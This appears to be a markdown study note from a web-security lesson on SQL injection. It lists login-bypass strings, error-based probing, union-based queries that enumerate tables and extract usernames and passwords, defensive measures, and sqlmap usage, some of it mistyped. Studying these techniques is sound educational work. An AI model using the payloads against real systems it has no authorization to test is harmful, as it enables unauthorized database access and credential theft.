# Web hacking and security
# ep2 - SQL Injection

# Introduction - 000500
## Basic SQL injection - 001200
## SQL commands - 002000
## (Classic SQLi)[https://testphp.vulnweb.com/login.php]
```sql
-- password
' or '1' = '1

-- username with #/-- to comment out after # depend on backend database system
admin ' or 1=1#
```
## Error-based SQLi - 005030
- add ' or " at the end of the URLs to define parameter name
## (Union-based SQLi - 005545)[159.223.81.121/login.php]
```sql
-- yyyy use the same number of columns on table
xxxx union select 'yyyy', 'yyyy' #

-- to check how many columns in database, because union-based SQLi technique MUST use with same columns of both table
xxx' order by 2# 

-- query out table list from database
select table_name from information_schema.tables

-- find the object's table
xxxx union select 'yyyy', 'table_name from information_schema.tables' #

-- find the table's columns
xxxx union select 'yyyy', 'column_name from information_schema.columns where table_name = 'SOME_TABLE' #

-- explore the database
xxxx union select username, password from SOME_TABLE #
```

# Protection method
## Do not show error from query
## convert special to string [mysql_real_escape_string]
## PDO
## NIST security framework
- identify
- protect
- detect
- respond
- recovery
## SIEM - Monitoring & Alerting with tools

# Tools
## sqlmap [Kali]
```bash
sqlmap -h
sql -u "URL" -U
sql -u "URL" -D
```